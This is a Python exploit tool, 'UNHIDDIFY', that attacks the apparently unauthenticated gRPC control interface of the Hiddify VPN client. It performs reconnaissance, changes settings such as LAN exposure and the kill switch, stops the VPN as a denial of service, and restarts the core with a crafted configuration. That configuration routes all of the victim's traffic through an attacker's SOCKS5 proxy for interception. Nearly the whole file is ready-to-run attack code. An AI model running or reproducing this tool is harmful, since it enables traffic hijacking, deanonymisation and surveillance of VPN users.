#!/usr/bin/env python3
import sys
import os
import grpc
import json
import time
import socket
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'grpc_gen'))

from v2.hcore import hcore_pb2
from v2.hcore import hcore_service_pb2_grpc
from v2.hcommon import common_pb2

class C:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    E = '\033[0m'
    BOLD = '\033[1m'

BANNER_ASCII = r"""
 _   _ _   _ _   _ ___ ____  ____ ___ ______   __
| | | | \ | | | | |_ _|  _ \|  _ \_ _|  ___\ \ / /
| | | |  \| | |_| || || | | | | | | || |_   \ V / 
| |_| | |\  |  _  || || |_| | |_| | ||  _|   | |  
 \___/|_| \_|_| |_|___|____/|____/___|_|      |_|  
"""

BANNER = f"""{C.R}{C.BOLD}{BANNER_ASCII}{C.E}
{C.Y}         gRPC IPC Hijacking & Traffic Interception{C.E}
"""

KNOWN_SETTINGS = {
    "AllowConnectionFromLAN": {
        "type": "bool",
        "description": "Allow incoming connections from local network",
        "impact": "CRITICAL - Exposes gRPC to LAN attackers"
    },
    "ServiceMode": {
        "type": "string",
        "options": ["vpn", "system-proxy", "tun"],
        "description": "VPN service mode",
        "impact": "HIGH - Changes traffic routing method"
    },
    "SystemProxyEnabled": {
        "type": "bool",
        "description": "Enable system-wide proxy",
        "impact": "MEDIUM - Routes system traffic through VPN"
    },
    "StrictRoute": {
        "type": "bool",
        "description": "Enforce strict routing (Kill Switch)",
        "impact": "HIGH - Disabling exposes real IP on VPN drop"
    },
    "EnableDNSRouting": {
        "type": "bool",
        "description": "Route DNS through VPN",
        "impact": "MEDIUM - Prevents DNS leaks"
    },
    "EnableIPv6": {
        "type": "bool",
        "description": "Enable IPv6 support",
        "impact": "LOW - May cause leaks if misconfigured"
    },
    "MTU": {
        "type": "int",
        "description": "Maximum Transmission Unit (1280-1500)",
        "impact": "LOW - Performance tuning"
    },
    "ConnectionTestUrl": {
        "type": "string",
        "description": "URL for connection testing",
        "impact": "MEDIUM - Can be redirected"
    },
    "RemoteDNS": {
        "type": "string",
        "description": "Remote DNS server address",
        "impact": "MEDIUM - DNS resolution control"
    },
    "DirectDNS": {
        "type": "string",
        "description": "Direct DNS server address",
        "impact": "MEDIUM - Bypass DNS resolution"
    },
    "BlockAds": {
        "type": "bool",
        "description": "Enable ad blocking",
        "impact": "LOW - Content filtering"
    },
    "BlockMalware": {
        "type": "bool",
        "description": "Enable malware blocking",
        "impact": "LOW - Security feature"
    },
    "LogEnabled": {
        "type": "bool",
        "description": "Enable logging",
        "impact": "HIGH - May leak sensitive data"
    },
    "LogLevel": {
        "type": "string",
        "options": ["debug", "info", "warn", "error"],
        "description": "Logging verbosity",
        "impact": "MEDIUM - More logs = more data exposure"
    }
}

class Exploit:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.channel = None
        self.core = None

    def connect(self):
        try:
            self.channel = grpc.insecure_channel(f'{self.host}:{self.port}')
            grpc.channel_ready_future(self.channel).result(timeout=10)
            self.core = hcore_service_pb2_grpc.CoreStub(self.channel)
            return True
        except Exception as e:
            print(f"{C.R}[-] Connection failed: {e}{C.E}")
            return False

    def get_system_info(self):
        try:
            r = self.core.GetSystemInfo(common_pb2.Empty(), timeout=5)
            print(f"\n{C.G}[+] System information retrieved:{C.E}")
            for field in r.DESCRIPTOR.fields:
                val = getattr(r, field.name, None)
                if val not in (None, "", 0, False, []):
                    print(f"    {C.BOLD}{field.name}{C.E}: {val}")
            return r
        except Exception as e:
            print(f"{C.R}[-] Error: {e}{C.E}")
            return None

    def change_settings(self, settings_dict):
        try:
            req = hcore_pb2.ChangeHiddifySettingsRequest(
                hiddify_settings_json=json.dumps(settings_dict)
            )
            self.core.ChangeHiddifySettings(req, timeout=5)
            print(f"{C.G}[+] Settings changed: {json.dumps(settings_dict, indent=2)}{C.E}")
            return True
        except Exception as e:
            print(f"{C.R}[-] Error: {e}{C.E}")
            return False

    def stop_vpn(self):
        try:
            self.core.Stop(common_pb2.Empty(), timeout=5)
            print(f"{C.G}[+] VPN stopped successfully{C.E}")
            return True
        except Exception as e:
            print(f"{C.R}[-] Stop error: {e}{C.E}")
            return False

    def start_with_config(self, config_content, name="hijack"):
        try:
            req = hcore_pb2.StartRequest(
                config_content=config_content,
                config_name=name
            )
            self.core.Start(req, timeout=10)
            print(f"{C.G}[+] Core restarted with new configuration{C.E}")
            return True
        except Exception:
            try:
                req = hcore_pb2.StartRequest(
                    config_content=config_content,
                    config_name=name
                )
                self.core.Restart(req, timeout=10)
                print(f"{C.G}[+] Core restarted with new configuration{C.E}")
                return True
            except Exception as e:
                print(f"{C.R}[-] Error: {e}{C.E}")
                return False

    def attack(self, attacker_ip, socks_port):
        print(f"\n{C.R}{C.BOLD}[*] ATTACK SEQUENCE{C.E}")
        print(f"    Stage 1: Stop current VPN")
        print(f"    Stage 2: Generate malicious configuration")
        print(f"    Stage 3: Restart core with hijacked config")
        print(f"    Result: All victim traffic routed through your proxy")
        
        if input(f"\n{C.R}[?] CONFIRM ATTACK (yes/no): {C.E}").strip() != "yes":
            return False
        
        print(f"\n{C.Y}[*] Stage 1/3: Stopping VPN...{C.E}")
        self.stop_vpn()
        time.sleep(1)
        
        print(f"{C.Y}[*] Stage 2/3: Generating malicious config...{C.E}")
        config = self.create_malicious_config(attacker_ip, socks_port)
        
        print(f"{C.Y}[*] Stage 3/3: Applying hijacked configuration...{C.E}")
        self.start_with_config(config)
        
        print(f"\n{C.G}{C.BOLD}[+] ATTACK COMPLETE{C.E}")
        print(f"{C.G}[+] All victim traffic now routed through:{C.E}")
        print(f"    {attacker_ip}:{socks_port} (SOCKS5)")
        print(f"\n{C.Y}[*] Start enhanced proxy on attacker machine:{C.E}")
        print(f"    python3 stealth_proxy.py {socks_port}")
        print(f"\n{C.Y}[*] In stealth_proxy.py, type 'stats' to view traffic analysis{C.E}")
        return True

    def create_malicious_config(self, attacker_ip, attacker_port):
        config = {
            "log": {"level": "warn", "output": ""},
            "dns": {"servers": [{"tag": "remote", "address": "tcp://8.8.8.8"}]},
            "inbounds": [{
                "type": "tun",
                "inet4_address": "172.19.0.1/30",
                "auto_route": True,
                "strict_route": True,
                "sniff": True
            }],
            "outbounds": [
                {
                    "type": "socks",
                    "tag": "attacker-proxy",
                    "server": attacker_ip,
                    "server_port": int(attacker_port),
                    "version": "5"
                },
                {
                    "type": "direct",
                    "tag": "direct"
                }
            ],
            "route": {
                "rules": [
                    {
                        "outbound": "attacker-proxy",
                        "ip_cidr": ["0.0.0.0/0"]
                    }
                ],
                "final": "attacker-proxy"
            }
        }
        return json.dumps(config, indent=2)

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "192.168.1.100"

def interactive_settings_menu(ex):
    while True:
        print(f"\n{C.M}{C.BOLD}{'='*60}{C.E}")
        print(f"{C.BOLD}CHANGE SETTINGS - Interactive Menu{C.E}")
        print(f"{C.M}{'='*60}{C.E}\n")
        
        settings_list = list(KNOWN_SETTINGS.keys())
        for i, key in enumerate(settings_list, 1):
            info = KNOWN_SETTINGS[key]
            impact_color = C.R if "CRITICAL" in info["impact"] else (C.Y if "HIGH" in info["impact"] else C.G)
            print(f"  {C.BOLD}[{i:2d}]{C.E} {key:<30} {impact_color}{info['impact']}{C.E}")
            print(f"       {info['description']}")
        
        print(f"\n  {C.BOLD}[{len(settings_list)+1}]{C.E} Custom setting (JSON)")
        print(f"  {C.BOLD}[0]{C.E} Back to main menu")
        
        try:
            choice = input(f"\n{C.Y}Select setting [0-{len(settings_list)+1}]: {C.E}").strip()
        except (KeyboardInterrupt, EOFError):
            break
        
        if choice == "0":
            break
        elif choice == str(len(settings_list) + 1):
            custom = input(f"{C.Y}Enter JSON setting: {C.E}").strip()
            if custom:
                try:
                    ex.change_settings(json.loads(custom))
                except json.JSONDecodeError:
                    print(f"{C.R}[-] Invalid JSON{C.E}")
        else:
            try:
                idx = int(choice) - 1
                if 0 <= idx < len(settings_list):
                    key = settings_list[idx]
                    info = KNOWN_SETTINGS[key]
                    
                    print(f"\n{C.BOLD}Setting: {key}{C.E}")
                    print(f"{C.Y}Type: {info['type']}{C.E}")
                    print(f"{C.Y}Description: {info['description']}{C.E}")
                    print(f"{C.Y}Impact: {info['impact']}{C.E}")
                    
                    if info["type"] == "bool":
                        val = input(f"{C.Y}Value (true/false): {C.E}").strip().lower()
                        if val in ["true", "false"]:
                            ex.change_settings({key: val == "true"})
                        else:
                            print(f"{C.R}[-] Invalid boolean value{C.E}")
                    elif info["type"] == "int":
                        val = input(f"{C.Y}Value (integer): {C.E}").strip()
                        try:
                            ex.change_settings({key: int(val)})
                        except ValueError:
                            print(f"{C.R}[-] Invalid integer{C.E}")
                    elif info["type"] == "string":
                        if "options" in info:
                            print(f"{C.Y}Options: {', '.join(info['options'])}{C.E}")
                        val = input(f"{C.Y}Value: {C.E}").strip()
                        if val:
                            ex.change_settings({key: val})
            except (ValueError, IndexError):
                print(f"{C.R}[-] Invalid selection{C.E}")

def main():
    print(BANNER)
    
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_host> <target_port>")
        print(f"Example: {sys.argv[0]} 127.0.0.1 17078")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    print(f"{C.Y}[*] Target: {host}:{port}{C.E}")
    
    ex = Exploit(host, port)
    if not ex.connect():
        sys.exit(1)
    
    print(f"{C.G}[+] Connected successfully (no authentication required){C.E}")
    
    while True:
        print(f"\n{C.M}{C.BOLD}{'='*60}{C.E}")
        print(f"{C.BOLD} MENU{C.E}")
        print(f"{C.M}{'='*60}{C.E}")
        print(f"  {C.G}{C.BOLD}[1]{C.E} {C.BOLD}Reconnaissance (SystemInfo){C.E}")
        print(f"  {C.Y}{C.BOLD}[2]{C.E} {C.BOLD}Change settings (interactive){C.E}")
        print(f"  {C.R}{C.BOLD}[3]{C.E} {C.BOLD}STOP VPN (DoS){C.E}")
        print(f"  {C.R}{C.BOLD}[4]{C.E} {C.BOLD}ATTACK (Stop + Hijack + Traffic){C.E}")
        print(f"  {C.BOLD}[0]{C.E} {C.BOLD}Exit{C.E}")
        
        try:
            choice = input(f"\n{C.Y}> {C.E}").strip()
        except (KeyboardInterrupt, EOFError):
            break
        
        if choice == "1":
            ex.get_system_info()
        
        elif choice == "2":
            interactive_settings_menu(ex)
        
        elif choice == "3":
            if input(f"{C.R}[?] Confirm VPN STOP (yes/no): {C.E}").strip() == "yes":
                ex.stop_vpn()
        
        elif choice == "4":
            attacker_ip = input(f"{C.Y}[*] Attacker IP [{get_local_ip()}]: {C.E}").strip() or get_local_ip()
            attacker_port = input(f"{C.Y}[*] Proxy port [8080]: {C.E}").strip() or "8080"
            ex.attack(attacker_ip, attacker_port)
        
        elif choice == "0":
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[*] Interrupted{C.E}")
